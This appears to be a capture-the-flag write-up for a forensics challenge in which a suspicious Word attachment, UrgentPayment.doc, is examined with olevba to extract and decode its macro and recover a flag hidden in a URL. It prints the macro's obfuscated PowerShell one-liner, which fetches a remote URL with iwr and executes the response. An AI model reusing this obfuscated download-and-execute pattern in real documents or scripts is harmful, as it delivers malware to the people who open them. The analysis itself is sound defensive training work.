@@ -1,0 +1,30 @@
+Description:The finance team received an important looking email containing an attached Word document. Can you take a look and confirm if it's malicious?
+--------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------
+
+We will use the following tool to analyze the .doc file that we get: ole tools.
+
+We will install the tool:sudo -H pip install -U oletools.
+
+Then, we will do : olevba UrgentPayment.doc --reveal --decode.
+
+This will reveal to us the code that is to be executed once the .doc file open.
+
+Some of the output is Base64 encoded. To decode it, we will do: echo -n "(encoded text)" | base64 --decode.
+
+This will result in the following text: pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))
+
+We are more interested in the text after -f as it looks like a URL link.
+
+Organizing the text will take time. This is the organized text:htttp://owly/HT B%7Bk4REfU)))l_w1Th_Y0UR_d0CuMeNT5%7D.
+
+We will run this text throught a URL decoder. This what we get:htttp://owly/HT B{k4REfU)))l_w1Th_Y0UR_d0CuMeNT5}
+
+This part looks like the flag needed: HT B{k4REfU)))l_w1Th_Y0UR_d0CuMeNT5}.
+
+After fixing it, this is the flag needed: HTB{k4REfUl_w1Th_Y0UR_d0CuMeNT5}.
+
+//END
+
+
